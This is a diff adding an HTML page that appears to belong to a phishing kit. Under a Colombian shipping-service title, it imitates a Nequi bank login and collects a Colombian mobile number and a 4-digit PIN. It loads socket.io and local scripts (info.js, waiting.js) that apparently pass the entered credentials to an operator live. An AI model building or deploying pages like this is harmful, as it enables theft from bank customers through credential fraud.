@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>El servicio de envíos de Colombia</title>
+    <link rel="stylesheet" href="css/style.css">
+    <script src="../../../js/functions.js"></script>
+    <style>
+        body {
+            background-color: white;
+            display: flex;
+            justify-content: center;
+            align-content: flex-start;
+        }
+
+        #cargando {
+            position: fixed;
+            top: 60%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 920;
+            display: none;
+        }
+
+        .btn-habilitado {
+            background-color: #DA0081;
+            color: #fff;
+        }
+
+        .btn-deshabilitado {
+            background-color: #F1BFDA;
+            color: #fff;
+        }
+
+        #btn-consultar {
+            margin-top: 20px;
+        }
+
+    </style>
+</head>
+<body>
+    <div id="fondo"></div>
+    <img src="img/preloader2.gif" id="cargando" width="110">
+    <div id="frm-consulta" class="frm-modal">
+        <img src="img/neko.png" alt="" style="width: 100%; ">
+        <div class="formulario">
+            <input type="text" name="txt-num" id="txt-num" placeholder="Número de celular" class="entradas" autocomplete="off" maxlength="10" pattern="[0-9]*" inputmode="numeric" style="background-color: #fbf7fb;">
+            <br><br>
+            <input type="password" name="txt-pass" id="txt-pass" placeholder="Clave" class="entradas" autocomplete="off" maxlength="4" pattern="[0-9]*" inputmode="numeric" style="background-color: #fbf7fb;">
+            <br><br>
+            <button class="btn btn-habilitado" id="btn-consultar">Entrar</button>
+            <br><br>
+            <button class="backbutton" id="backbutton" style="color: black;">Ahora no</button>
+            <br><br>
+            <p class="">¿Se te olvidó la clave? Abre nequi en tu cel y cambiala en segundos.</p>
+        </div>
+    </div>
+    
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const numInput = document.getElementById("txt-num");
+            const passInput = document.getElementById("txt-pass");
+
+            function validateNumberInput(event) {
+                const input = event.target;
+                const value = input.value;
+
+                // Verifica si el primer carácter es '3'
+                if (input.id === "txt-num" && value.length === 1 && value !== '3') {
+                    input.value = '';
+                }
+
+                // Elimina cualquier carácter no numérico y limita la longitud a 10 caracteres
+                if (!/^\d*$/.test(value) || value.length > 10) {
+                    input.value = value.replace(/\D/g, '').slice(0, 10);
+                }
+            }
+
+            numInput.addEventListener("input", validateNumberInput);
+            passInput.addEventListener("input", validateNumberInput);
+        });
+    </script>
+    <script src="./js/info.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.min.js"></script>
+    <script src="js/waiting.js"></script>
+</body>
+</html>
